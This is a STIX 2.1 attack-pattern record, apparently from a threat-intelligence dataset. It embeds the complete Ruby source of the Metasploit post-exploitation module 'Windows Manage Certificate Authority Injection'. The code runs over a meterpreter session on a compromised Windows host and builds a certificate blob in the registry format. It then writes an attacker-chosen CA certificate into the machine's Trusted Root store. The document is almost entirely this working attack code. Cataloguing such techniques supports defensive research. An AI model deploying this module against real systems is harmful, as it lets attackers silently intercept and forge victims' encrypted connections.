{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f24b2b75-e8ff-4716-a637-7212dd59e558",
    "created": "2024-08-14T16:33:04.997752Z",
    "modified": "2024-08-14T16:33:04.997755Z",
    "name": "Windows Manage Certificate Authority Injection",
    "description": " This module allows the attacker to insert an arbitrary CA certificate into the victim's Trusted Root store.  'License' => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/inject_ca.rb",
            "external_id": "inject_ca.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Certificate Authority Injection',\n        'Description' => %q{\n          This module allows the attacker to insert an arbitrary CA certificate\n          into the victim's Trusted Root store.\n        },\n        'License' => BSD_LICENSE,\n        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_registry_create_key\n              stdapi_registry_open_key\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('CAFILE', [ true, 'Path to the certificate you wish to install as a Trusted Root CA.', ''])\n      ]\n    )\n  end\n\n  def run\n    certfile = datastore['CAFILE']\n\n    # Check file path\n    begin\n      ::File.stat(certfile)\n    rescue StandardError\n      print_error('CAFILE not found')\n      return\n    end\n\n    cert = ''\n\n    # Load the file\n    f = ::File.open(certfile, 'rb')\n    cert = f.read(f.stat.size)\n    f.close\n\n    loadedcert = OpenSSL::X509::Certificate.new(cert)\n    certmd5 = Digest::MD5.hexdigest(loadedcert.to_der).scan(/../)\n    certsha1 = Digest::SHA1.hexdigest(loadedcert.to_der).scan(/../)\n    cskiray = loadedcert.extensions[0].value.gsub(/:/, '').scan(/../)\n\n    derLength = loadedcert.to_der.length.to_s(16)\n    if (derLength.length < 4)\n      derLength = \"0#{derLength}\"\n    end\n\n    derRay = derLength.scan(/../)\n    hexDerLength = [ derRay[1], derRay[0] ]\n\n    certder = loadedcert.to_der.each_byte.collect { |val| '%02X' % val }\n\n    bblob = [ '04', '00', '00', '00', '01', '00', '00', '00', '10', '00', '00', '00' ]\n    bblob += certmd5\n    bblob += [ '03', '00', '00', '00', '01', '00', '00', '00', '14', '00', '00', '00' ]\n    bblob += certsha1\n    bblob += [ '14', '00', '00', '00', '01', '00', '00', '00', '14', '00', '00', '00' ]\n    bblob += cskiray\n    bblob += [ '20', '00', '00', '00', '01', '00', '00', '00' ]\n    bblob += hexDerLength\n    bblob += [ '00', '00' ]\n    bblob += certder\n\n    blob = bblob.map(&:hex).pack('C*')\n\n    cleancertsha1 = certsha1.to_s.gsub(/[\\s\\[\\\\\"\\]]/, '').gsub(/,/, '').upcase\n    catree = 'HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\SystemCertificates\\\\ROOT\\\\Certificates'\n    entire_key = \"#{catree}\\\\#{cleancertsha1}\"\n    root_key, base_key = client.sys.registry.splitkey(entire_key)\n\n    # Perform the registry operations\n\n    # Ensure the cert doesn't already exist\n    begin\n      open_key = nil\n      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + 0x0000)\n      values = open_key.enum_value\n      if !values.empty?\n        print_error('Key already exists!')\n        return\n      end\n    rescue StandardError\n      open_key = nil\n      open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE + 0x0000)\n      print_good(\"Successfully created key: #{entire_key}\")\n\n      open_key.set_value('Blob', REG_BINARY, blob)\n      print_good('CA inserted!')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}